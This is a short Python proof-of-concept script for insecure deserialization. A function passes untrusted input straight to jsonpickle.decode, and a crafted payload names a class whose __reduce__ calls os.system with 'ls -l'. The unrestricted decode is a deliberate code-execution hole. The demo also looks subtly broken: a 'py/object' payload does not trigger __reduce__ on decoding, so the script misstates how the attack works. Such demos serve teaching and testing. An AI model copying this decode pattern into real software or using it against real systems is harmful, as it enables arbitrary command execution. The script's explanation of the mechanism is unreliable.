import jsonpickle

# Vulnerable deserialization function
def vulnerable_deserialize(data):
    # Directly using jsonpickle's decode method without any restrictions
    try:
        return jsonpickle.decode(data)
    except Exception as e:
        print(f"Error during deserialization: {e}")
        return None

# Example usage with a malicious payload
malicious_payload = '{"py/object": "__main__.YourMaliciousClass"}'
# Before running, make sure the YourMaliciousClass exists
class YourMaliciousClass:
    def __reduce__(self):
      import os
      return (os.system, ("ls -l",))

result = vulnerable_deserialize(malicious_payload)